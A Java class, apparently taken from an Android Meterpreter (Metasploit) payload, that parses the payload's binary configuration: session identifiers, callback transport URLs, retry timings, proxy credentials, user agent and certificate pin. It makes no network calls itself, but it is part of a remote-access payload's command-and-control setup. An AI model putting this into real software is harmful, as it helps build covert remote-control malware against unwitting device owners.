package com.htetznaing.metesploit;

import java.io.UnsupportedEncodingException;
import java.util.concurrent.TimeUnit;

public class ConfigParser {
    private static final int SESSION_EXPIRY_START_LEN = 12;
    private static final int UUID_LEN = 16;
    private static final int GUID_LEN = 16;
    private static final int INT_LEN = 4;
    private static final int URL_LEN = 512;
    private static final int UA_LEN = 256;
    private static final int PROXY_HOST_LEN = 128;
    private static final int PROXY_USER_LEN = 64;
    private static final int PROXY_PASS_LEN = 64;
    private static final int CERT_HASH_LEN = 20;
    private static final long MS = TimeUnit.SECONDS.toMillis(1L);

    public static Config parseConfig(byte[] paramArrayOfByte)
    {
        Config localConfig = new Config();
        localConfig.rawConfig = paramArrayOfByte;
        int i = 0;
        localConfig.flags = unpack32(paramArrayOfByte, 0);
        i += 12;
        localConfig.session_expiry = (MS * unpack32(paramArrayOfByte, i));
        i += 4;
        localConfig.uuid = readBytes(paramArrayOfByte, i, 16);
        i += 16;
        localConfig.session_guid = readBytes(paramArrayOfByte, i, 16);
        i += 16;
        if ((localConfig.flags & 0x1) != 0) {
            localConfig.stageless_class = readString(paramArrayOfByte, 8000, 100);
        }
        while (paramArrayOfByte[i] != 0)
        {
            TransportConfig localTransportConfig = new TransportConfig();
            localTransportConfig.url = readString(paramArrayOfByte, i, 512);
            i += 512;
            localTransportConfig.comm_timeout = (MS * unpack32(paramArrayOfByte, i));
            i += 4;
            localTransportConfig.retry_total = (MS * unpack32(paramArrayOfByte, i));
            i += 4;
            localTransportConfig.retry_wait = (MS * unpack32(paramArrayOfByte, i));
            i += 4;
            if (localTransportConfig.url.startsWith("http"))
            {
                localTransportConfig.proxy = readString(paramArrayOfByte, i, 128);
                i += 128;
                localTransportConfig.proxy_user = readString(paramArrayOfByte, i, 64);
                i += 64;
                localTransportConfig.proxy_pass = readString(paramArrayOfByte, i, 64);
                i += 64;
                localTransportConfig.user_agent = readString(paramArrayOfByte, i, 256);
                i += 256;
                localTransportConfig.cert_hash = null;
                byte[] arrayOfByte = readBytes(paramArrayOfByte, i, 20);
                i += 20;
                for (int j = 0; j < arrayOfByte.length; j++) {
                    if (arrayOfByte[j] != 0)
                    {
                        localTransportConfig.cert_hash = arrayOfByte;
                        break;
                    }
                }
                String str = readString(paramArrayOfByte, i);
                localTransportConfig.custom_headers = str;
                i += str.length();
            }
            localConfig.transportConfigList.add(localTransportConfig);
        }
        return localConfig;
    }

    private static String readString(byte[] paramArrayOfByte, int paramInt)
    {
        StringBuilder localStringBuilder = new StringBuilder();
        int i = paramArrayOfByte.length;
        for (int j = paramInt; j < i; j++)
        {
            int k = paramArrayOfByte[j];
            if (k == 0) {
                break;
            }
            localStringBuilder.append((char)(k & 0xFF));
        }
        return localStringBuilder.toString();
    }

    private static String readString(byte[] paramArrayOfByte, int paramInt1, int paramInt2)
    {
        byte[] arrayOfByte = readBytes(paramArrayOfByte, paramInt1, paramInt2);
        try
        {
            return new String(arrayOfByte, "ISO-8859-1").trim();
        }
        catch (UnsupportedEncodingException localUnsupportedEncodingException) {}
        return new String(arrayOfByte).trim();
    }

    private static byte[] readBytes(byte[] paramArrayOfByte, int paramInt1, int paramInt2)
    {
        byte[] arrayOfByte = new byte[paramInt2];
        System.arraycopy(paramArrayOfByte, paramInt1, arrayOfByte, 0, paramInt2);
        return arrayOfByte;
    }

    private static int unpack32(byte[] paramArrayOfByte, int paramInt)
    {
        int i = 0;
        for (int j = 0; j < 4; j++) {
            i |= (paramArrayOfByte[(j + paramInt)] & 0xFF) << j * 8;
        }
        return i;
    }

    private static long unpack64(byte[] paramArrayOfByte, int paramInt)
    {
        long l = 0L;
        for (int i = 0; i < 8; i++) {
            l |= (paramArrayOfByte[(i + paramInt)] & 0xFF) << i * 8;
        }
        return l;
    }
}
